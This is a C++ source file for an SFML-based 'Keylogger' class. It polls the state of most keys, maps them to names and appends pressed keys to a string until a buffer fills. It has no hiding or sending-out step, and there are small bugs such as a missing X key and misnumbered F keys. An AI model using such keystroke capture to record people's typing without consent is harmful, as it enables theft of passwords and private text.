#include "Keylogger.h"
#include <thread>

#define checkLetter(A) 	\
	static bool A = false;	\
	bool clicked##A = pressed(Keyboard::A);\
	if (clicked##A && !A) { A = true; result.push_back(Keyboard::A); }\
	else if (!clicked##A) A = false;\

using namespace sf;

std::vector<Keylogger::key> Keylogger::keysPressed() {
	static constexpr auto pressed = Keyboard::isKeyPressed;
	std::vector<Keyboard::Key> result;
	//letters
	checkLetter(A)
	checkLetter(B)
	checkLetter(C)
	checkLetter(D)
	checkLetter(E)
	checkLetter(F)
	checkLetter(G)
	checkLetter(H)
	checkLetter(I)
	checkLetter(J)
	checkLetter(K)
	checkLetter(L)
	checkLetter(M)
	checkLetter(N)
	checkLetter(O)
	checkLetter(P)
	checkLetter(Q)
	checkLetter(R)
	checkLetter(S)
	checkLetter(T)
	checkLetter(U)
	checkLetter(V)
	checkLetter(W)
	checkLetter(Y)
	checkLetter(Z)
	//numbers
	checkLetter(Num0)
	checkLetter(Num1)
	checkLetter(Num2)
	checkLetter(Num3)
	checkLetter(Num4)
	checkLetter(Num5)
	checkLetter(Num6)
	checkLetter(Num7)
	checkLetter(Num8)
	checkLetter(Num9)
	//extra keys
	checkLetter(Up)
	checkLetter(Down)
	checkLetter(Right)
	checkLetter(Left)
	checkLetter(Tab)
	checkLetter(Escape)
	checkLetter(Backslash)
	checkLetter(Backspace)
	checkLetter(Comma)
	checkLetter(Dash)
	checkLetter(Delete)
	checkLetter(Divide)
	checkLetter(Enter)
	checkLetter(Equal)
	checkLetter(Hyphen)
	checkLetter(Insert)
	checkLetter(LAlt)
	checkLetter(LBracket)
	checkLetter(LShift)
	checkLetter(LControl)
	checkLetter(Multiply)
	checkLetter(Period)
	checkLetter(Quote)
	checkLetter(RAlt)
	checkLetter(RBracket)
	checkLetter(RControl)
	checkLetter(Return)
	checkLetter(RShift)
	checkLetter(SemiColon)
	checkLetter(Slash)
	checkLetter(Space)
	checkLetter(Subtract)
	checkLetter(Tilde)
	return result;
}
void Keylogger::loadSupportedKeys()
{
	supportedKeys = {
		{sf::Keyboard::Up, "Up"},
		{sf::Keyboard::Down, "Down"},
		{sf::Keyboard::Right, "Right"},
		{sf::Keyboard::Left, "Left"},
		{sf::Keyboard::Tab, "Tab"},
		{sf::Keyboard::Escape, "Escape"},
		{sf::Keyboard::Backslash, "Backslash"},
		{sf::Keyboard::BackSpace, "BackSpace"},
		{sf::Keyboard::Comma, ","},
		{sf::Keyboard::Dash, "-"},
		{sf::Keyboard::Delete, "Delete"},
		{sf::Keyboard::Divide, "Divide"},
		{sf::Keyboard::End, "End"},
		{sf::Keyboard::Enter, "Enter"},
		{sf::Keyboard::Equal, "="},
		{sf::Keyboard::Home, "Home"},
		{sf::Keyboard::Hyphen, "-"},
		{sf::Keyboard::Insert, "Insert"},
		{sf::Keyboard::LAlt, "LAlt"},
		{sf::Keyboard::LBracket, "["},
		{sf::Keyboard::LShift, "LShift"},
		{sf::Keyboard::LSystem, "LSystem"},
		{sf::Keyboard::LControl, "LControl"},
		{sf::Keyboard::Menu, "Menu"},
		{sf::Keyboard::Multiply, "*"},
		{sf::Keyboard::PageDown, "PageDown"},
		{sf::Keyboard::PageUp, "PageUp"},
		{sf::Keyboard::Pause, "Pause"},
		{sf::Keyboard::Period, "."},
		{sf::Keyboard::Quote, "'"},
		{sf::Keyboard::RAlt, "RAlt"},
		{sf::Keyboard::RBracket, "RBracket"},
		{sf::Keyboard::RControl, "RControl"},
		{sf::Keyboard::Return, "Return"},
		{sf::Keyboard::RShift, "RShift"},
		{sf::Keyboard::RSystem, "RSystem"},
		{sf::Keyboard::SemiColon, ";"},
		{sf::Keyboard::Slash, "/"},
		{sf::Keyboard::Space, " "},
		{sf::Keyboard::Subtract, "-"},
		{sf::Keyboard::Tilde, "`"}
	};
	//alphabet
	for (int i = 0; i <= 25; i++) {
		supportedKeys.emplace(static_cast<sf::Keyboard::Key>(i), std::string(1, 'A' + i));
	}
	//numbers
	for (int i = 0; i <= 9; i++) {
		auto numBegin = static_cast<int>(sf::Keyboard::Num0);
		auto numpadBegin = static_cast<int>(sf::Keyboard::Numpad0);

		supportedKeys.emplace(static_cast<sf::Keyboard::Key>(numBegin + i), std::to_string(i));
		supportedKeys.emplace(static_cast<sf::Keyboard::Key>(numpadBegin + i), "Numpad" + std::to_string(i));
	}
	//F keys
	for (int i = 0; i <= 15; i++) {
		auto fBegin = static_cast<int>(sf::Keyboard::F1);
		supportedKeys.emplace(static_cast<sf::Keyboard::Key>(fBegin + i), "F" + std::to_string(i));
	}
}

Keylogger::Keylogger(size_t buffer_limit) : buffer_limit(buffer_limit) { loadSupportedKeys(); }

void Keylogger::write_to(std::string& str)
{
	while (true) {
		for (auto& key : keysPressed()) {
			str.append(supportedKeys[key]);
		}
		if (str.size() >= buffer_limit) {
			return;
		}
		std::this_thread::sleep_for(std::chrono::microseconds(1));
	}
}
